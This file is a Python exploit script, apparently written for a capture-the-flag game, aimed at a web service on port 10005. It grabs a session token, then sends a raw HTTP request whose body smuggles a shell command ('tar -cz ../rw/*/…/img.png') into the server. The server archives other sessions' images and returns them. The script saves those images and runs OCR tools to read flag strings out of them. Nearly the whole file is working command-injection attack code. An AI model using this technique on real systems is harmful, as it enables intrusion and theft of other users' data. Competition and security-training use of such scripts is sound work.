#!/usr/bin/env python3
import io
from pwn import *
import random
import re
import requests
import string
import tarfile
import shutil
import sys

url = 'http://' + sys.argv[1] + ':10005'
response = requests.get(url + '/a-beginning')
session, token = re.search(b'/love\?session=([^&]+)&token=([^"]+)', response.content).groups()

iox = remote(sys.argv[1], 10005)
#payload = b'  ;ls -t ../rw/*/*/img.png|head|tar -T - -c;'
session_id_mask = (sys.argv[2][:10] + '*').encode()
payload = b'  ;tar -cz ../rw/*/' + session_id_mask + b'/img.png;'
request = b'''GET /magic/219?session=''' + session + b'''&token=''' + token + b''' HTTP/1.1\r
Content-Length: ''' + str(len(payload)).encode() + b'''\r
\r
''' + payload
iox.send(request)
iox.recvuntil('or output.\n')
data = iox.recvuntil('HTTP/1.1 500 Internal Server Error')
with tarfile.open(mode='r:gz', fileobj=io.BytesIO(data)) as tf:
    for member in tf.getmembers():
        session_id, = re.search(r'data/(.+)/img.png', member.name).groups()
        png_name = sys.argv[1] + '-' + session_id + '.png'
        with open(png_name, 'wb') as imgfp:
            shutil.copyfileobj(tf.extractfile(member), imgfp)

png_name = sys.argv[1] + '-' + sys.argv[2] + '.png'
flag_chars = string.ascii_letters + string.digits
ocrs = []
if 0:
    for spec in ('250x250+335+360', '230x230+780+30', '60x60+100+65', '200x200+540+25'):
        tmp_png_name = 'tmp-' + png_name
        try:
            subprocess.check_call(['convert', '-extract', spec, png_name, tmp_png_name])
        except:
            continue
        ocr = subprocess.check_output(['tesseract', tmp_png_name, '-'], stderr=subprocess.DEVNULL).decode()
        ocr = ''.join([c for c in ocr if c in flag_chars])
        ocrs.append(ocr)
    ocrs.sort(key=len)
    print(ocrs[-1])
subprocess.check_call(['php', './recogn.php', png_name])

ocrs = []
try:
    ocrs.append(subprocess.check_output(['tesseract', png_name + '.out.pnm', '-'], stderr=subprocess.DEVNULL).decode())
except:
    pass
try:
    ocrs.append(subprocess.check_output(['gocr', '-m', '258', '-C', 'A-Za-z0-9', '-a', '5', png_name + '.out.pnm'], stderr=subprocess.DEVNULL).decode())
except:
    pass
for ocr in ocrs:
    ocr = ''.join([c for c in ocr if c in flag_chars])
    import itertools
    il = [i for i in range(len(ocr)) if ocr[i] in 'Il']
    if il:
        ocr = list(ocr)
        for sequence in itertools.product(*(['Il'] * len(il))):
            for pos, letter in zip(il, sequence):
                ocr[pos] = letter
            print(''.join(ocr))
    else:
        print(ocr)
